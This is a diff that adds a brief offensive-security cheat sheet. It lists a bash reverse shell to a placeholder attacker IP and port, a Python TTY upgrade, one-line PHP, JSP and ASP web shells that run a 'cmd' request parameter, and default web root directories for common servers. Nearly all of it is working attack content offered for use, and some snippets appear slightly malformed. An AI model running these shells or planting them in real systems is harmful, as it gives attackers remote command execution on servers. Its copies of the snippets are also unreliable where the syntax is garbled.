@@ -1,0 +1,33 @@
+Reverse Shell
+```
+bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'
+```
+​
+Upgrade TTY
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+​
+Web Shell
+
+PHP
+<?phpsystem($_REQUEST["cmd"]);?>
+​
+JSP
+<%.Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+​
+ASP
+<%. eval request("cmd") %>
+​
+Default Web Roots
+Apache
+/var/www/html
+​
+Nginx
+/usr/local/nginx/html
+​
+IIS
+C:\inetpub\wwwroot\
+​
+XAMPP
+C:\xampp\htdocs\
